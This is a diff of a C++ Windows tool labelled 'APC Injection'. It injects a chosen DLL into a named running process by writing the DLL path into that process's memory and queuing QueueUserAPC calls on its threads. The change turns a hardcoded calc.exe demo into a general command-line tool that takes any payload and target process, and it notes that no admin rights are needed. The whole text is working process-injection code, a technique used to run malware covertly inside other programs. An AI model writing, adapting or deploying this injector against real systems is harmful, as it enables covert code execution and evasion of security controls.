@@ -1,7 +1,10 @@
+//                APC Injection
 /* Method of injecting payload using QueueUserAPC() function */
-/* Purpose:
-            Inject 'payload/injectDll.dll to calc.exe process
-            Make sure the calculator is running              */
+/* 
+    Admin rights: Not required
+
+
+ */
 
 #include <windows.h>
 #include <TlHelp32.h>
@@ -40,17 +43,16 @@ bool FindProcess(const char* exeName, DWORD& pid, vector<DWORD>& tids) {
     return pid > 0 && !tids.empty();
 }
 
-void main()
+void apcInjection(const char* buffer, const char* process)
 {
 	DWORD pid;
 	vector<DWORD> tids;
-	const char buffer[] = "payload/injectDll.dll";
 	char lpdllpath[MAX_PATH];
 	GetFullPathName(buffer, MAX_PATH, lpdllpath, nullptr);
 	auto size = strlen(lpdllpath)*sizeof(TCHAR);
 	cout<<"[i] full path: "<<lpdllpath<<endl;
 
-	if (FindProcess("calc.exe", pid, tids)) {
+	if (FindProcess(process, pid, tids)) {
 		HANDLE hProcess = ::OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
 		if(hProcess==NULL){
 			cout<<"[!] failed to get handle for process: "<<pid<<endl;
@@ -69,7 +71,7 @@ void main()
 			return ;
 		}else{cout<<"[+] write to process success"<<endl;}
 
-		for(vector<DWORD>::size_type i = 0; i != tids.size() && i<5; i++) {
+		for(vector<DWORD>::size_type i = 0; i != tids.size() && i<10; i++) {
 			DWORD tid = tids[i];
 			HANDLE hThread = ::OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, tid);
 			cout<<endl;
@@ -95,4 +97,14 @@ void main()
 	else{
 		cout<<"[!] specified process not found"<<endl;
 	}
+}
+
+
+void main(int argc, char* argv[]){
+    if(argc!=3){
+        cout<<"Usage: apcInjection.exe payload process"<<endl;
+        return;
+    }
+    apcInjection(argv[1], argv[2]);
+    return;
 }
